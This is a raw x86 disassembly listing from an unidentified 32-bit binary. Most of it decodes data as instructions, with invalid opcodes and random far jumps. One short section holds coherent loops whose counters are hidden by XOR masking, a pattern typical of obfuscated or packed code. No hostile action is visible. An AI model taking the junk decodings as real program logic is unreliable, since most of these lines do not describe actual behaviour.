  40ee7a:	push   cs
  40ee7b:	sub    BYTE PTR [ebx+ebp*8-0x62],dh
  40ee7f:	xor    al,0x82
  40ee81:	test   BYTE PTR [edx-0xe],bh
  40ee84:	sub    BYTE PTR fs:[esi+0x70],cl
  40ee88:	jmp    0x39f4:0xcb36a839
  40ee8f:	cmp    DWORD PTR [edx+0xf0aafc6],ebx
  40ee95:	hlt    
  40ee96:	jbe    0x40eeb4
  40ee98:	(bad)  
  40ee99:	jo     0x40ee55
  40ee9b:	jl     0x40ef15
  40ee9d:	jg     0x40eefd
  40ee9f:	push   es
  40eea0:	cs pusha 
  40eea2:	adc    edi,DWORD PTR [ebx]
  40eea4:	mov    cl,dl
  40eea6:	xchg   ecx,eax
  40eea7:	add    ch,0x2
  40eeaa:	es sub eax,0x9b4057f8
  40eeb0:	xlat   BYTE PTR ds:[ebx]
  40eeb1:	ss cs pop ebx
  40eeb4:	jne    0x40eecf
  40eeb6:	push   cs
  40eeb7:	add    dh,BYTE PTR [edx-0x650c7b4b]
  40eebd:	aad    0xb2
  40eebf:	jl     0x40ee93
  40eec1:	or     eax,edi
  40eec3:	dec    edi
  40eec4:	mov    esp,0x41cf8a4
  40eec9:	repnz dec ebp
  40eecb:	arpl   dx,cx
  40eecd:	sbb    ecx,ecx
  40eecf:	mov    ecx,DWORD PTR [esi-0x58]
  40eed2:	mov    dh,0xa0
  40eed4:	pushf  
  40eed5:	pop    ecx
  40eed6:	int    0x1c
  40eed8:	(bad)  
  40eed9:	sar    BYTE PTR [ebx],1
  40eedb:	gs mov eax,0x82f4be40
  40eee1:	aam    0x82
  40eee3:	pushf  
  40eee4:	(bad)  
  40eee5:	push   esp
  40eee6:	(bad)  
  40eee8:	pop    ss
  40eee9:	mov    ds:0xfd2fdae1,eax
  40eeee:	hlt    
  40eeef:	fst    DWORD PTR [ebp-0x37cb26fb]
  40eef5:	into   
  40eef6:	aas    
  40eef7:	addr16 push edi
  40eef9:	push   esi
  40eefa:	mov    bh,0x1e
  40eefc:	push   ss
  40eefd:	pusha  
  40eefe:	daa    
  40eeff:	xor    eax,0x72581f9f
  40ef04:	add    eax,0x17447e1b
  40ef09:	xchg   esp,eax
  40ef0a:	sbb    al,0x99
  40ef0c:	fwait
  40ef0d:	mov    dh,0x8a
  40ef0f:	daa    
  40ef10:	test   BYTE PTR [ecx-0x3d63af1b],ah
  40ef16:	or     ecx,DWORD PTR [edi+0x56c21ef1]
  40ef1c:	inc    ebx
  40ef1d:	push   eax
  40ef1e:	es retf 
  40ef20:	sbb    bl,BYTE PTR [ecx+0xa]
  40ef23:	or     ecx,DWORD PTR [eax]
  40ef25:	jo     0x40ef63
  40ef27:	in     al,0xb6
  40ef29:	jle    0x40ef52
  40ef2b:	fisub  WORD PTR [ebx+0x4f]
  40ef2e:	adc    ecx,DWORD PTR [edx]
  40ef30:	push   eax
  40ef31:	or     al,0x41
  40ef33:	pop    ss
  40ef34:	scas   eax,DWORD PTR es:[edi]
  40ef35:	jnp    0x40ef30
  40ef37:	push   esi
  40ef38:	sbb    ah,dh
  40ef3a:	xchg   esi,eax
  40ef3b:	inc    ebp
  40ef3c:	inc    esp
  40ef3d:	das    
  40ef3e:	adc    BYTE PTR [edx-0x61516f],cl
  40ef44:	fild   DWORD PTR ss:[eax]
  40ef47:	push   esp
  40ef48:	sub    ah,BYTE PTR [ebx+0x2a900f7c]
  40ef4e:	mov    cl,0x80
  40ef50:	and    edx,ebx
  40ef52:	mov    esp,0xb363ac88
  40ef57:	(bad)  
  40ef58:	ins    DWORD PTR es:[edi],dx
  40ef59:	(bad)  
  40ef5a:	retf   
  40ef5b:	gs mov dl,0xe4
  40ef5e:	clc    
  40ef5f:	mov    esp,0x4bd1aac6
  40ef64:	sti    
  40ef65:	mov    dh,0x7
  40ef67:	push   esp
  40ef68:	cmc    
  40ef69:	popf   
  40ef6a:	aas    
  40ef6b:	cmp    cl,BYTE PTR [edx]
  40ef6d:	sbb    edi,DWORD PTR [edi+eax*1]
  40ef70:	sbb    al,0xb4
  40ef72:	or     edx,ecx
  40ef74:	fcom   DWORD PTR ds:0x8fdbdb70
  40ef7a:	push   0x24
  40ef7c:	out    dx,al
  40ef7d:	sub    eax,0x9ae4d360
  40ef82:	jg     0x40ef41
  40ef84:	std    
  40ef85:	sbb    bh,bl
  40ef87:	js     0x40efad
  40ef89:	lock and ecx,ebx
  40ef8c:	js     0x40efdf
  40ef8e:	pop    esp
  40ef8f:	dec    esp
  40ef90:	jno    0x40ef7a
  40ef92:	das    
  40ef93:	test   eax,0x1980987
  40ef98:	jns    0x40efc8
  40ef9a:	shl    DWORD PTR [ebp-0x54ba4458],1
  40efa0:	imul   DWORD PTR [ebx-0x7d]
  40efa3:	jmp    0x7d9c53fa
  40efa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa9:	inc    esi
  40efaa:	daa    
  40efab:	cdq    
  40efac:	mov    BYTE PTR [ecx],bh
  40efae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efaf:	sub    bh,al
  40efb1:	sbb    esi,ebp
  40efb3:	test   bh,cl
  40efb5:	sahf   
  40efb6:	adc    eax,0x18f2469a
  40efbb:	mov    ds,esi
  40efbd:	pop    ebp
  40efbe:	fwait
  40efbf:	aas    
  40efc0:	jmp    0xb43f:0x673d090b
  40efc7:	add    al,0x41
  40efc9:	outs   dx,DWORD PTR ds:[esi]
  40efca:	jmp    0x66005646
  40efcf:	int    0x2d
  40efd1:	sub    ebp,DWORD PTR [eax+ebx*1+0x2f]
  40efd5:	inc    esp
  40efd6:	imul   al
  40efd8:	std    
  40efd9:	inc    ebp
  40efda:	jl     0x40efd8
  40efdc:	add    al,0xff
  40efde:	xchg   ecx,eax
  40efdf:	xchg   ecx,eax
  40efe0:	pop    ecx
  40efe1:	cmc    
  40efe2:	or     ah,BYTE PTR [esi+0x5ea28560]
  40efe8:	mov    gs,esp
  40efea:	push   eax
  40efeb:	sub    ah,BYTE PTR [ecx]
  40efed:	daa    
  40efee:	pop    esi
  40efef:	ja     0x40f04d
  40eff1:	inc    esi
  40eff2:	fld    TBYTE PTR [edx-0x58]
  40eff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eff6:	in     eax,dx
  40eff7:	pop    edx
  40eff8:	adc    eax,0x403dd040
  40effd:	adc    eax,0x7b38c2e1
  40f002:	scas   al,BYTE PTR es:[edi]
  40f003:	jbe    0x40f031
  40f005:	addr16 mov al,ds:0xad1f
  40f009:	jb     0x40f00d
  40f00b:	add    eax,0xaf1c6b2c
  40f010:	pop    esi
  40f011:	fmul   st,st(3)
  40f013:	inc    ecx
  40f014:	mov    esi,0xb179ac1e
  40f019:	or     edx,esp
  40f01b:	xor    al,0x1e
  40f01d:	stos   BYTE PTR es:[edi],al
  40f01e:	xchg   ebp,eax
  40f01f:	mov    dh,dl
  40f021:	jns    0x40efe4
  40f023:	jl     0x40f007
  40f025:	xor    dh,BYTE PTR [edx+0x41480642]
  40f02b:	xchg   DWORD PTR [esi+0x3d],ecx
  40f02e:	aaa    
  40f02f:	jbe    0x40efd7
  40f031:	mov    esi,0xd58d81c7
  40f036:	sub    al,0x64
  40f038:	pop    ss
  40f039:	xor    esp,DWORD PTR [esi]
  40f03b:	(bad)  
  40f03c:	or     DWORD PTR [eax-0x4cbb99b4],ecx
  40f042:	cmp    ecx,esi
  40f044:	add    eax,0x896b3281
  40f049:	test   eax,0xe365dc96
  40f04e:	repnz retf 
  40f050:	xor    al,0xb1
  40f052:	inc    esi
  40f053:	(bad)  
  40f054:	sub    eax,0xd7907a34
  40f059:	and    esp,DWORD PTR [ecx+0x5a4b559]
  40f05f:	dec    esi
  40f060:	mov    cl,0xb0
  40f062:	push   esp
  40f063:	iret   
  40f064:	pop    esi
  40f065:	mov    eax,edx
  40f067:	xor    al,0xf3
  40f069:	pop    ecx
  40f06a:	mov    esp,0x182bda98
  40f06f:	rol    DWORD PTR [esi-0x45],1
  40f072:	shl    ch,1
  40f074:	ficomp DWORD PTR [edi+eax*1-0x2fae8cd2]
  40f07b:	shl    BYTE PTR [ebx],1
  40f07d:	je     0x40f01a
  40f07f:	add    eax,0x38224f23
  40f084:	add    ch,al
  40f086:	sub    edi,DWORD PTR [ebp+0x692e7622]
  40f08c:	icebp  
  40f08d:	ins    DWORD PTR es:[edi],dx
  40f08e:	xchg   BYTE PTR [ecx],cl
  40f090:	add    BYTE PTR [ecx-0x3e9f5099],ah
  40f096:	popf   
  40f097:	jl     0x40f029
  40f099:	pop    edi
  40f09a:	(bad)  
  40f09b:	scas   al,BYTE PTR es:[edi]
  40f09c:	in     eax,dx
  40f09d:	sti    
  40f09e:	(bad)  
  40f09f:	jmp    0x359e:0x922eb91b
  40f0a6:	pop    esi
  40f0a7:	retf   0xc29e
  40f0aa:	cmc    
  40f0ab:	adc    ch,BYTE PTR [ebx-0x7bdabbb0]
  40f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b2:	call   0xb6405b63
  40f0b7:	pop    ebx
  40f0b8:	push   edi
  40f0b9:	in     al,0xd9
  40f0bb:	xlat   BYTE PTR ds:[ebx]
  40f0bc:	adc    DWORD PTR [edx+ebp*8],0xffffffb4
  40f0c0:	or     dh,BYTE PTR [ebx-0x2fa059c8]
  40f0c6:	shl    BYTE PTR [esi],0x78
  40f0c9:	pop    DWORD PTR [eax-0x13]
  40f0cc:	jns    0x40f10a
  40f0ce:	stos   DWORD PTR es:[edi],eax
  40f0cf:	pop    ecx
  40f0d0:	inc    edi
  40f0d1:	aam    0x53
  40f0d3:	lods   eax,DWORD PTR ds:[esi]
  40f0d4:	arpl   WORD PTR [ecx-0x6615092b],si
  40f0da:	js     0x40f138
  40f0dc:	or     WORD PTR [edi-0x23a98714],ax
  40f0e3:	pop    ds
  40f0e4:	push   ss
  40f0e5:	jecxz  0x40f0a1
  40f0e7:	repnz shl DWORD PTR [edx+eax*2+0x68f0219e],1
  40f0ef:	and    edi,ebp
  40f0f1:	pop    ebx
  40f0f2:	sbb    BYTE PTR [edx-0x5eb533a9],ch
  40f0f8:	dec    ebp
  40f0f9:	dec    esi
  40f0fa:	jle    0x40f173
  40f0fc:	and    eax,0x67d07cf1
  40f101:	pop    esp
  40f102:	mov    edx,0xffb67b66
  40f107:	mov    dh,0xbc
  40f109:	gs loopne 0x40f134
  40f10c:	pusha  
  40f10d:	jmp    FWORD PTR [edx]
  40f10f:	jne    0x40f0b3
  40f111:	ret    
  40f112:	cmp    BYTE PTR [ecx],dh
  40f114:	mov    al,ds:0xc05b0ca8
  40f119:	cmp    BYTE PTR [edx+0x39],0xcb
  40f11d:	out    dx,al
  40f11e:	jbe    0x40f140
  40f120:	dec    ebx
  40f121:	mov    al,0xff
  40f123:	ja     0x40f18e
  40f125:	jmp    0xd1a7:0x1b7eb32
  40f12c:	ret    0xd11b
  40f12f:	push   esp
  40f130:	ins    DWORD PTR es:[edi],dx
  40f131:	adc    BYTE PTR [esi+0x691e0577],0x44
  40f138:	call   0x1e977ab0
  40f13d:	sbb    al,0xf3
  40f13f:	repnz cmp DWORD PTR [edi],esi
  40f142:	retf   0x4d21
  40f145:	jmp    0xaff0715b
  40f14a:	mov    ah,0x73
  40f14c:	popa   
  40f14d:	lock cmp DWORD PTR [ecx],edi
  40f150:	adc    DWORD PTR [esi+0x29],0xffffffee
  40f154:	or     cl,BYTE PTR [edx]
  40f156:	pop    es
  40f157:	inc    edi
  40f158:	loopne 0x40f0ea
  40f15a:	mov    dh,0xa7
  40f15c:	aam    0x88
  40f15e:	outs   dx,DWORD PTR ds:[esi]
  40f15f:	daa    
  40f160:	loopne 0x40f1e1
  40f162:	pusha  
  40f163:	add    BYTE PTR [esi+0x33],0xbc
  40f167:	repnz push edx
  40f169:	push   eax
  40f16a:	push   cs
  40f16b:	js     0x40f1c3
  40f16d:	stos   DWORD PTR es:[edi],eax
  40f16e:	dec    edx
  40f16f:	ror    eax,1
  40f171:	pop    ss
  40f172:	or     BYTE PTR ds:0x756d6c16,0x9c
  40f179:	fst    DWORD PTR [edi]
  40f17b:	pop    esi
  40f17c:	addr16 add esp,edx
  40f17f:	mov    cl,ch
  40f181:	and    BYTE PTR es:0x62b2e2e,ah
  40f188:	cmc    
  40f189:	mov    bh,0x40
  40f18b:	pop    ds
  40f18c:	ret    
  40f18d:	and    al,BYTE PTR [ebx-0x1e]
  40f190:	test   eax,0x1317762d
  40f195:	push   ebp
  40f196:	neg    DWORD PTR [edx]
  40f198:	mov    WORD PTR [esi-0x13],?
  40f19b:	shr    DWORD PTR [edx+0x78],1
  40f19e:	std    
  40f19f:	or     bl,BYTE PTR [edx]
  40f1a1:	daa    
  40f1a2:	inc    eax
  40f1a3:	in     eax,0x3a
  40f1a5:	xchg   ebp,eax
  40f1a6:	nop
  40f1a7:	arpl   dx,si
  40f1a9:	and    ebx,ebp
  40f1ab:	inc    esp
  40f1ac:	mov    ebx,0x1d79f498
  40f1b1:	outs   dx,DWORD PTR ds:[esi]
  40f1b2:	cli    
  40f1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1b4:	daa    
  40f1b5:	mov    WORD PTR [ecx],es
  40f1b7:	dec    eax
  40f1b8:	pop    ecx
  40f1b9:	cld    
  40f1ba:	not    DWORD PTR [edi-0x1]
  40f1bd:	and    al,0xec
  40f1bf:	in     al,dx
  40f1c0:	jb     0x40f172
  40f1c2:	test   BYTE PTR [esi],dl
  40f1c4:	adc    al,0x7f
  40f1c6:	adc    eax,0xc6969eb6
  40f1cb:	xor    al,0xab
  40f1cd:	mov    al,ds:0x62b65a1e
  40f1d2:	lds    ebx,FWORD PTR [ecx+0x10f41230]
  40f1d8:	jae    0x40f177
  40f1da:	nop
  40f1db:	lods   al,BYTE PTR ds:[esi]
  40f1dc:	push   ds
  40f1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1de:	enter  0xeb18,0x48
  40f1e2:	sub    eax,ecx
  40f1e4:	mov    edi,0xbbe337a7
  40f1e9:	and    ah,ah
  40f1eb:	sub    al,0xb0
  40f1ed:	lods   eax,DWORD PTR ds:[esi]
  40f1ee:	scas   al,BYTE PTR es:[edi]
  40f1ef:	es cdq 
  40f1f1:	ficomp WORD PTR [ebp-0x5a3125b3]
  40f1f7:	imul   eax,DWORD PTR [eax+0x3],0xc0e5ddda
  40f1fe:	stos   BYTE PTR es:[edi],al
  40f1ff:	adc    al,0xae
  40f201:	adc    DWORD PTR [ebp+0x3a9d68f0],ebp
  40f207:	je     0x40f22f
  40f209:	dec    ebx
  40f20a:	aad    0xc0
  40f20c:	xlat   BYTE PTR ds:[ebx]
  40f20d:	xchg   edx,eax
  40f20e:	xchg   ecx,eax
  40f20f:	jne    0x40f210
  40f211:	pop    edx
  40f212:	loopne 0x40f28f
  40f214:	iret   
  40f215:	sti    
  40f216:	adc    eax,0x474fc73
  40f21b:	data16 cld 
  40f21d:	mov    ah,BYTE PTR [edx+ebp*2+0x7a43d10e]
  40f224:	mov    BYTE PTR ds:[esp+esi*8-0x61],bl
  40f229:	xor    BYTE PTR [edi-0x6b9a510b],bl
  40f22f:	(bad)  
  40f230:	je     0x40f27f
  40f232:	push   0xfffffffd
  40f234:	xchg   DWORD PTR es:[edx+eax*8-0x61],eax
  40f239:	sub    ebx,DWORD PTR [edi+0x1e]
  40f23c:	sbb    ah,bh
  40f23e:	push   ebp
  40f23f:	retf   0x7969
  40f242:	(bad)  
  40f243:	mov    es,edi
  40f245:	jne    0x40f2ab
  40f247:	mov    edx,0xe3a60e0d
  40f24c:	push   ebp
  40f24d:	inc    eax
  40f24e:	jp     0x40f29d
  40f250:	scas   al,BYTE PTR es:[edi]
  40f251:	jbe    0x40f1ed
  40f253:	jmp    0x40f1dc
  40f255:	cmp    DWORD PTR [bx+si+0x42],0xffffff99
  40f25a:	push   0x4b
  40f25c:	int3   
  40f25d:	aaa    
  40f25e:	dec    DWORD PTR [ebx+0x7ba8297d]
  40f264:	je     0x40f22a
  40f266:	sub    eax,0x9b1bce2e
  40f26b:	sbb    ebx,DWORD PTR [ebx+0x6aa36cf0]
  40f271:	fidiv  WORD PTR [edx-0x68bc8d8d]
  40f277:	or     DWORD PTR [edx-0x7cacabf9],esp
  40f27d:	stos   DWORD PTR es:[edi],eax
  40f27e:	test   BYTE PTR [edi+eiz*1-0x5b845a06],al
  40f285:	fcom   DWORD PTR [esi]
  40f287:	cmp    dl,BYTE PTR [ebx]
  40f289:	arpl   dx,ax
  40f28b:	cmp    al,0x45
  40f28d:	ret    0x9bde
  40f290:	les    esi,FWORD PTR [eax+edx*8-0x6d9014]
  40f297:	sub    BYTE PTR [edi*1-0x15a42433],0xef
  40f29f:	clc    
  40f2a0:	mov    ebx,0xf6e456b7
  40f2a5:	or     eax,0x6de83f25
  40f2aa:	sahf   
  40f2ab:	pop    edi
  40f2ac:	bound  esp,QWORD PTR [ebx-0x5d06f942]
  40f2b2:	xor    ah,BYTE PTR [ebx-0x2137fa93]
  40f2b8:	ror    BYTE PTR [ebp-0x21],cl
  40f2bb:	loopne 0x40f2f7
  40f2bd:	jmp    0x40f305
  40f2bf:	lahf   
  40f2c0:	aaa    
  40f2c1:	sbb    al,0x68
  40f2c3:	ret    
  40f2c4:	stos   BYTE PTR es:[edi],al
  40f2c5:	js     0x40f33a
  40f2c7:	out    0x65,al
  40f2c9:	or     ecx,DWORD PTR [eax-0x2b714a6a]
  40f2cf:	mov    ebp,0xea5a263
  40f2d4:	mov    ds:0x47bc3b77,al
  40f2d9:	mov    ebp,0xe53c8740
  40f2de:	pusha  
  40f2df:	arpl   WORD PTR [ebp-0x14],ax
  40f2e2:	cmp    BYTE PTR [ebx],cl
  40f2e4:	cmp    DWORD PTR [esi+eax*2-0x43],esi
  40f2e8:	dec    eax
  40f2e9:	retf   0xdbde
  40f2ec:	sub    eax,0x3409b561
  40f2f1:	mov    ebp,0x9928ce43
  40f2f6:	jp     0x40f28a
  40f2f8:	sbb    DWORD PTR [eax-0x2eb646cc],ecx
  40f2fe:	pusha  
  40f2ff:	mov    dl,0x39
  40f301:	fdiv   DWORD PTR [edi]
  40f303:	(bad)  
  40f304:	or     al,0x81
  40f306:	jne    0x40f2da
  40f308:	jecxz  0x40f361
  40f30a:	mov    DWORD PTR [ebx-0x3827099e],ecx
  40f310:	cmp    BYTE PTR [edx-0x50f8ac18],dh
  40f316:	jo     0x40f2a2
  40f318:	ins    BYTE PTR es:[edi],dx
  40f319:	mov    eax,ds:0xc83fac4c
  40f31e:	push   edx
  40f31f:	or     eax,edx
  40f321:	outs   dx,DWORD PTR ds:[esi]
  40f322:	outs   dx,BYTE PTR ds:[esi]
  40f323:	mov    ch,0xf9
  40f325:	mov    WORD PTR [edi],cs
  40f327:	cmp    DWORD PTR [eax],0xbfa451dd
  40f32d:	or     bl,al
  40f32f:	int3   
  40f330:	shl    BYTE PTR [ecx],cl
  40f332:	ja     0x40f377
  40f334:	shl    BYTE PTR cs:[ecx],1
  40f337:	jle    0x40f3ae
  40f339:	mov    es,ebp
  40f33b:	cmp    ebp,0x79
  40f33e:	lds    ecx,FWORD PTR [edx-0x79]
  40f341:	jp     0x40f359
  40f343:	stc    
  40f344:	int3   
  40f345:	mov    cl,0x6a
  40f347:	leave  
  40f348:	sar    BYTE PTR ds:0xbd00289d,1
  40f34e:	pushf  
  40f34f:	loopne 0x40f30e
  40f351:	mov    esp,0x7daaf279
  40f356:	and    DWORD PTR [ecx-0x20],ebp
  40f359:	mov    ds:0xb30221f3,eax
  40f35e:	pusha  
  40f35f:	out    dx,eax
  40f360:	stos   DWORD PTR es:[edi],eax
  40f361:	push   esi
  40f362:	leave  
  40f363:	(bad)  
  40f364:	das    
  40f365:	push   edx
  40f366:	inc    esi
  40f367:	mov    eax,0x585146ba
  40f36c:	dec    edx
  40f36d:	(bad)  
  40f36f:	xchg   ebx,eax
  40f370:	fild   WORD PTR [esi-0x50f80af1]
  40f376:	stos   DWORD PTR es:[edi],eax
  40f377:	mov    WORD PTR [esi-0x237afd22],?
  40f37d:	ror    BYTE PTR [ebp+0x6c],cl
  40f380:	mov    ebx,DWORD PTR [edx]
  40f382:	xor    edi,ebx
  40f384:	mov    DWORD PTR [edx],edi
  40f386:	mov    edx,DWORD PTR [ebp+0x8]
  40f389:	xor    edx,eax
  40f38b:	inc    ecx
  40f38c:	inc    DWORD PTR [ebp-0x18]
  40f38f:	add    edx,esi
  40f391:	cmp    ecx,edx
  40f393:	jb     0x40cfd4
  40f399:	jmp    0x40f3e3
  40f39e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3a1:	mov    DWORD PTR [ebp+0x8],ecx
  40f3a4:	jmp    0x40f3d6
  40f3a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ac:	mov    edx,DWORD PTR [ebp-0x8]
  40f3af:	xor    ecx,eax
  40f3b1:	xor    edx,eax
  40f3b3:	sub    ecx,edx
  40f3b5:	sub    ecx,esi
  40f3b7:	xor    ecx,eax
  40f3b9:	mov    DWORD PTR [ebp+0x8],ecx
  40f3bc:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3bf:	mov    edx,DWORD PTR [ebp+0x8]
  40f3c2:	imul   edx,edx,0x5708f1
  40f3c8:	xor    ecx,eax
  40f3ca:	add    ecx,esi
  40f3cc:	lea    ecx,[ebp+ecx*4-0x64]
  40f3d0:	mov    edi,DWORD PTR [ecx]
  40f3d2:	add    edx,edi
  40f3d4:	mov    DWORD PTR [ecx],edx
  40f3d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3d9:	xor    ecx,eax
  40f3db:	add    ecx,esi
  40f3dd:	jne    0x40f3a9
  40f3e3:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3e6:	mov    DWORD PTR [ebp+0x8],ecx
  40f3e9:	jmp    0x40f41b
  40f3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3f1:	mov    edx,DWORD PTR [ebp-0x8]
  40f3f4:	xor    ecx,eax
  40f3f6:	xor    edx,eax
  40f3f8:	sub    ecx,edx
  40f3fa:	sub    ecx,esi
  40f3fc:	xor    ecx,eax
  40f3fe:	mov    DWORD PTR [ebp+0x8],ecx
  40f401:	mov    ecx,DWORD PTR [ebp+0x8]
  40f404:	mov    edx,DWORD PTR [ebp+0x8]
  40f407:	imul   edx,edx,0x5708f1
  40f40d:	xor    ecx,eax
  40f40f:	add    ecx,esi
  40f411:	lea    ecx,[ebp+ecx*4-0x64]
  40f415:	mov    edi,DWORD PTR [ecx]
  40f417:	add    edx,edi
  40f419:	mov    DWORD PTR [ecx],edx
  40f41b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f41e:	xor    ecx,eax
  40f420:	add    ecx,esi
  40f422:	jne    0x40f3ee
  40f428:	mov    ecx,DWORD PTR [ebp-0x8]
  40f42b:	mov    edx,DWORD PTR [ebp-0x20]
  40f42e:	xor    ecx,eax
  40f430:	lea    ecx,[ecx+edx*1+0x3272dc]
  40f437:	mov    DWORD PTR [ebp-0x20],ecx
  40f43a:	inc    DWORD PTR [ebp+0xc]
  40f43d:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f440:	xor    ecx,eax
  40f442:	add    ecx,esi
  40f444:	jne    0x40ced6
  40f44a:	jmp    0x413be3
  40f44f:	mov    ecx,DWORD PTR [ebp-0xc]
  40f452:	mov    DWORD PTR [ebp+0x8],ecx
  40f455:	jmp    0x41180f
  40f45a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f45d:	mov    edx,DWORD PTR [ebp-0x8]
  40f460:	xor    ecx,eax
  40f462:	xor    edx,eax
  40f464:	sub    ecx,edx
  40f466:	jmp    0x4117ee
  40f46b:	mov    al,ds:0x7334f23d
  40f470:	cmp    ebp,DWORD PTR [edx+0x3e2d7a79]
  40f476:	mov    ds:0xa90876f6,al
  40f47b:	pop    ebp
  40f47c:	int    0x7c
  40f47e:	jl     0x40f487
  40f480:	pop    edi
  40f481:	jl     0x40f4ff
  40f483:	adc    ebx,DWORD PTR [ecx+eiz*4-0x58]
  40f487:	xor    dh,dh
  40f489:	shl    edi,cl
  40f48b:	sbb    esi,DWORD PTR ds:0x7a2040bb
  40f491:	rcr    BYTE PTR [esi],1
  40f493:	jbe    0x40f4c7
  40f495:	mov    eax,ds:0x9aff3501
  40f49a:	dec    ebx
  40f49b:	fadd   QWORD PTR [edx+0x15628d4d]
  40f4a1:	dec    edx
  40f4a2:	and    BYTE PTR [edx+0x17],al
  40f4a5:	or     ebp,esp
  40f4a7:	out    0xed,eax
  40f4a9:	ins    BYTE PTR es:[edi],dx
  40f4aa:	inc    eax
  40f4ab:	or     eax,0x283a671e
  40f4b0:	retf   0x4e05
  40f4b3:	shl    DWORD PTR [esp+eax*8+0x30071bce],cl
  40f4ba:	xchg   DWORD PTR [ebp-0x43167744],esp
  40f4c0:	js     0x40f4ac
  40f4c2:	fstp   TBYTE PTR [bx-0x2645]
  40f4c7:	mov    ah,0x24
  40f4c9:	pop    ds
  40f4ca:	sbb    cl,BYTE PTR [ebp+eiz*2-0x6d]
  40f4ce:	mov    al,0x15
  40f4d0:	sub    BYTE PTR [eax+0x59],al
  40f4d3:	sbb    al,0x3b
  40f4d5:	xor    edi,ebx
  40f4d7:	pop    edi
  40f4d8:	cs push edx
  40f4da:	xor    eax,DWORD PTR [edi-0x60]
  40f4dd:	adc    DWORD PTR [esi-0x5c],0x16420236
  40f4e4:	add    eax,0x54d52a8f
  40f4e9:	inc    ebx
  40f4ea:	xor    al,BYTE PTR [ebx+0x32a4d056]
  40f4f0:	shl    DWORD PTR [ebp+0x27],cl
  40f4f3:	aaa    
  40f4f4:	lds    esp,FWORD PTR [edx-0x6d3eca39]
  40f4fa:	fild   WORD PTR [esi+0x9]
  40f4fd:	sar    DWORD PTR [edi],0xe3
  40f500:	inc    ecx
  40f501:	out    dx,al
  40f502:	ins    BYTE PTR es:[edi],dx
  40f503:	out    0xc6,al
  40f505:	cmp    eax,0x18f75d8c
  40f50a:	out    dx,eax
  40f50b:	mov    esp,es
  40f50d:	push   cs
  40f50e:	sti    
  40f50f:	sbb    DWORD PTR [edi],esp
  40f511:	mov    ds:0x831aef9,al
  40f516:	mov    ds,WORD PTR [edx+0x6c]
  40f519:	leave  
  40f51a:	inc    eax
  40f51b:	jmp    0xbef44637
  40f520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f521:	out    0x84,al
  40f523:	dec    ebx
  40f524:	mov    ebp,0xd8ef51a2
  40f529:	div    DWORD PTR [ebp+edx*1+0x77]
  40f52d:	pop    edi
  40f52e:	jne    0x40f59c
  40f530:	jo     0x40f4df
  40f532:	dec    esp
  40f533:	ins    DWORD PTR es:[edi],dx
  40f534:	test   eax,0xf575d76b
  40f539:	xchg   esp,eax
  40f53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f53b:	add    bh,cl
  40f53d:	hlt    
  40f53e:	mov    ds:0x8b2b02,al
  40f543:	in     al,dx
  40f544:	xor    al,0x7e
  40f546:	test   ebx,eax
  40f548:	ror    DWORD PTR [ecx],0x74
  40f54b:	xor    al,0x56
  40f54d:	(bad)  
  40f54e:	stos   DWORD PTR es:[edi],eax
  40f54f:	mov    esi,0x5a378f9b
  40f554:	stos   DWORD PTR es:[edi],eax
  40f555:	mov    eax,ds:0xb7ab9e1
  40f55a:	in     al,dx
  40f55b:	js     0x40f5d2
  40f55d:	dec    edx
  40f55e:	test   DWORD PTR [esp+ebp*2-0xe86c2bf],0x51b236f1
  40f569:	pusha  
  40f56a:	mov    esi,eax
  40f56c:	cmp    ebx,DWORD PTR [ebx-0x5d]
  40f56f:	mov    WORD PTR [esi+0x6c],cs
  40f572:	(bad)
  40f575:	out    dx,eax
  40f576:	inc    esp
  40f577:	inc    esp
  40f578:	imul   ecx,edi,0x1b
  40f57b:	fld    QWORD PTR [ebx+eiz*8]
  40f57e:	inc    edi
  40f57f:	mov    dh,BYTE PTR [eax+0x44]
  40f582:	dec    edx
  40f583:	fst    DWORD PTR [ecx+0x22fd6240]
  40f589:	mov    al,ds:0xff3cc97e
  40f58e:	inc    edi
  40f58f:	sub    ecx,DWORD PTR [ebp+0xc]
  40f592:	adc    DWORD PTR [ecx],esp
  40f594:	sti    
  40f595:	pushf  
  40f596:	inc    ebp
  40f597:	inc    esi
  40f598:	sub    DWORD PTR [ebp-0x3f238dfc],edx
  40f59e:	mov    BYTE PTR [ebp-0x5d688fcf],bl
  40f5a4:	xor    BYTE PTR [edx+0x45473afe],0xd
  40f5ab:	mov    al,ds:0x7eb626c4
  40f5b0:	inc    ecx
  40f5b1:	jl     0x40f5c9
  40f5b3:	cmp    al,0x5
  40f5b5:	mov    esi,0x3192f79f
  40f5ba:	enter  0x89da,0x9f
  40f5be:	call   DWORD PTR ds:0xb31e5763
  40f5c4:	mov    cl,0xe4
  40f5c6:	cmp    DWORD PTR [esi+0x6277f4f5],ecx
  40f5cc:	xor    BYTE PTR [esi-0x23],al
  40f5cf:	imul   edi,DWORD PTR [ebp+0x53],0xd77ed861
  40f5d6:	xor    al,0x76
  40f5d8:	rol    BYTE PTR [ebp+0x23550216],1
  40f5de:	add    DWORD PTR [ebx-0x5d],edx
  40f5e1:	dec    eax
  40f5e2:	in     eax,0xba
  40f5e4:	rcl    ecx,0x9e
  40f5e7:	mov    BYTE PTR [ebx-0x1a],bh
  40f5ea:	adc    al,0xd3
  40f5ec:	mov    dh,dl
  40f5ee:	pop    edi
  40f5ef:	int3   
  40f5f0:	ins    BYTE PTR es:[edi],dx
  40f5f1:	jne    0x40f5c0
  40f5f3:	push   edi
  40f5f4:	mov    cs,WORD PTR [eax+0x1b]
